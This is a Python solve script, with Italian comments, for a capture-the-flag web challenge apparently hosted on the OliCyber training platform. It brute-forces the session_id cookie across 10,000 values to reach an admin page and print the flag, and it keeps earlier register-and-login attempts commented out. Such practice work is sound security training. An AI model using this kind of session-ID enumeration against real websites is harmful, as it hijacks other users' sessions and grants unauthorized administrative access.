""""
import sys

import requests
session = requests.Session()
x = 999

for i in range(1000,4001):
    x += 1
    register_url = 'http://too-small-reminder.challs.olicyber.it/register'
    register_data = {'username': 'admin', 'password': 'admin'}
    register_response = session.post(register_url, json=register_data)
    #print("Registrazione:")
    #print(register_response.text)

    login_url = 'http://too-small-reminder.challs.olicyber.it/login'
    login_data = {'username': "admin", 'password': 'admin'}
    login_response = session.post(login_url, json=login_data)
    #cookie = login_response.cookies
    #print("\nLogin:")
    #print(login_response.text)
    login_response.cookies.set('session_id', f'{x}')
    print(f'Tentativo: {x}')
    #for cookie in login_response.cookies:
    #    if cookie.name == 'session_id':
    #        cookie = login_response.cookies
    #        cookie = x
    #        print('Tentativo' + x)

    admin_url = 'http://too-small-reminder.challs.olicyber.it/admin'
    admin_response = session.get(admin_url)
    print("\nAdmin Page:")
    print(admin_response.text)
    if admin_response.text.__contains__('flag'):
        sys.exit()
"""
"""
import requests

# Inizializza la sessione
session = requests.Session()

# Fase di registrazione
register_url = 'http://too-small-reminder.challs.olicyber.it/register'
register_data = {'username': 'fedebosio', 'password': 'admin'}
register_response = session.post(register_url, json=register_data)
print("Registrazione:")
print(register_response.text)

# Fase di login
login_url = 'http://too-small-reminder.challs.olicyber.it/login'
login_data = {'username': "fedebosio", 'password': 'admin'}
login_response = session.post(login_url, json=login_data)

# Stampa i cookie ricevuti dopo il login
print("\nCookie dopo il login:")

# Controlla i cookie e modifica manualmente se necessario
if 'session_id' in session.cookies:
    session.cookies.set('session_id', '5000')  # Prova a forzare il valore del cookie

# Accesso alla pagina admin
admin_url = 'http://too-small-reminder.challs.olicyber.it/admin'
admin_response = session.get(admin_url)

print("\nAdmin Page:")
print(admin_response.text)
print(login_response.cookies)
"""

import sys
import requests

for x in range(0, 10000):
    print(f"Tentativo con session_id = {x}")
    admin_url = 'http://too-small-reminder.challs.olicyber.it/admin'
    admin_response = requests.get(admin_url, cookies={'session_id': str(x)})
    print(admin_response)
    if 'flag' in admin_response.text:
        print(f"Flag trovata! Tentativo con session_id = {x}")
        print(admin_response.text)
        sys.exit()

print("Flag non trovata nel range specificato.")

